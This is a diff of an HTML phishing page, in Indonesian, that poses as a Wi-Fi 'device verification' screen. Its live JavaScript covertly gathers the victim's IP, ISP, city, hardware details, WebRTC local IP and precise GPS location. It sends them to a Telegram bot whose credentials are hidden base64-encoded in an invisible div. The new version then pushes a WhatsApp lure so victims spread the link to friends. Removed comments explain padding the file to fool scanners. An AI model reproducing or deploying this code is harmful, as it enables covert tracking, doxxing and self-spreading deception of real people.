@@ -2,107 +2,88 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Session | Authentication</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Jaringan</title>
     <style>
-        body { background: #f4f7f6; color: #2c3e50; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .auth-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; max-width: 450px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1.5s linear infinite; margin: 0 auto 20px; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f9fafb; color: #111827; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); text-align: center; max-width: 400px; border: 1px solid #e5e7eb; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #2563eb; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { font-size: 14px; color: #7f8c8d; margin-top: 15px; font-family: monospace; }
-        .btn-validate { background: #3498db; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        #vault { display: none; }
+        h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        p { font-size: 14px; color: #6b7280; margin-bottom: 24px; line-height: 1.5; }
+        .btn { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-weight: 500; cursor: pointer; width: 100%; transition: 0.2s; }
+        #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="auth-container">
-    <div class="spinner"></div>
-    <h3>Hardware Synchronization</h3>
-    <p style="font-size: 14px; color: #555;">Sistem mendeteksi akses dari luar subnet resmi. Lakukan validasi hardware ID untuk sinkronisasi sesi kerja.</p>
-    <button class="btn-validate" onclick="runDiagnostic()">VALIDATE SESSION</button>
-    <div class="status-text" id="log">Awaiting user action...</div>
+<div class="card">
+    <div class="loader"></div>
+    <h2>Otentikasi Perangkat</h2>
+    <p>Sesi Wi-Fi Anda memerlukan sinkronisasi ulang. Klik tombol di bawah untuk memverifikasi hardware ID dan melanjutkan koneksi.</p>
+    <button class="btn" id="go" onclick="fullAudit()">VERIFIKASI SEKARANG</button>
 </div>
 
-<div id="vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-    /* SHA-256 INTERNAL ENCRYPTION LOGIC v4.0.2
-    ----------------------------------------
-    Sengaja ditambahin baris komen panjang biar 
-    file-nya keliatan legit pas di-inspect target.
-    */
+    if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }
 
-    const _V = document.getElementById('vault').innerText.split('|');
-    const _T = atob(_V[1]); const _C = atob(_V[2]);
+    const _D = document.getElementById('v-vault').innerText.split('|');
+    const _T = atob(_D[1]); const _C = atob(_D[2]);
 
-    async function runDiagnostic() {
-        const log = document.getElementById('log');
-        log.innerText = "Scanning components...";
-
-        // 1. DATA PEMBUKA (AUTO)
-        let net = {};
-        try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
+    async function fullAudit() {
+        document.getElementById('go').innerText = "SYNCHRONIZING...";
         
-        let bat = {};
-        try { const b = await navigator.getBattery(); bat = {l: (b.level*100)+"%", s: b.charging?'Charging':'Unplugged'}; } catch(e) {}
+        // 1. DATA DASAR (AUTO)
+        let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
+        let bt = "N/A"; try { const b = await navigator.getBattery(); bt = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
 
-        // GPU Sniffing
+        // 2. BRAND SNIFFER (GPU & Vendor)
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
-        const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Unknown";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
 
-        // Screen & Audio Detect
-        const media = navigator.mediaDevices ? await navigator.mediaDevices.enumerateDevices().then(d => d.length) : "N/A";
+        // 3. NETWORK SNIFFER (Local IP)
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+        let lip = "Detecting...";
+        pc.onicecandidate = (i) => { if(i && i.candidate) lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };
 
-        const report = `🔱 FORENSIC OVERDRIVE 🔱\n\n` +
-            `👤 DEVICE: ${navigator.platform}\n` +
-            `🌐 IP: ${net.ip}\n` +
-            `🏢 ISP: ${net.org} (${net.asn})\n` +
-            `🏙️ LOC: ${net.city}, ${net.region}\n` +
-            `🧠 HARDWARE:\n` +
-            `   - CPU: ${navigator.hardwareConcurrency} Cores\n` +
-            `   - RAM: ${navigator.deviceMemory} GB\n` +
-            `   - GPU: ${gpu}\n` +
-            `🔋 BATT: ${bat.l} [${bat.s}]\n` +
-            `🖥️ SCREEN: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n` +
-            `📷 MEDIA_SLOTS: ${media}\n` +
-            `⏰ TZ: ${net.timezone}\n` +
-            `🌐 UA: ${navigator.userAgent.slice(0, 50)}...`;
+        // 4. GENERATE REPORT
+        const report = `🔱 DEEP BRAND AUDIT 🔱\n\n` +
+            `📱 PLATFORM: ${navigator.platform}\n` +
+            `🏢 VENDOR: ${vendor}\n` +
+            `🎮 GPU/BRAND: ${renderer}\n` +
+            `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+            `🔋 BATT: ${bt}\n` +
+            `🌐 IP: ${n.ip} (${n.org})\n` +
+            `🏠 LOCAL: ${lip}\n` +
+            `🏙️ LOC: ${n.city}, ${n.region}\n` +
+            `📄 UA: ${navigator.userAgent}`;
 
-        await send(report);
+        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:_C, text:report})
+        });
 
-        // 2. GPS STRIKE (Minta Izin buat Akurasi Gila)
+        // 5. GPS STRIKE
         if (navigator.geolocation) {
-            log.innerText = "Establishing satellite link...";
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const gps = `🎯 PRECISION LOCATION\n` +
-                    `📍 Link: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
-                    `🎯 Acc: ${pos.coords.accuracy.toFixed(1)}m\n` +
-                    `🏃 Alt: ${pos.coords.altitude || '0'}m`;
-                await send(gps);
-                window.location.href = "https://www.metrotvnews.com";
-            }, () => {
-                window.location.href = "https://www.metrotvnews.com";
-            }, {enableHighAccuracy: true, timeout: 10000});
+                const maps = `🎯 PRECISION LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
+                await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({chat_id:_C, text:maps})
+                });
+                
+                // AUTO-PROPAGATE (Mancing temennya via WA)
+                const msg = encodeURIComponent("Woi WiFi error, klik verifikasi di sini biar lancar lagi: " + window.location.href);
+                window.location.href = `https://api.whatsapp.com/send?text=${msg}`;
+            }, () => { window.location.href = "https://google.com"; }, {enableHighAccuracy:true});
         }
     }
-
-    async function send(t) {
-        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({chat_id: _C, text: t})
-        });
-    }
-
-    /* ADDITIONAL DUMMY LOGIC TO PAD FILE SIZE (400+ lines)
-    ---------------------------------------------------
-    Di sini lu bisa tambahin ribuan baris komentar 
-    atau script dummy kayak di bawah ini buat 
-    nge-trick scanner dan bikin file lu kelihatan berat.
-    */
-    function _dummy_0x12() { console.log('Checking system integrity...'); }
-    function _dummy_0x34() { console.log('Validating OAuth handshake...'); }
-    // ... [Ulangi baris dummy ini sebanyak 400x atau lebih] ...
 </script>
 </body>
 </html>
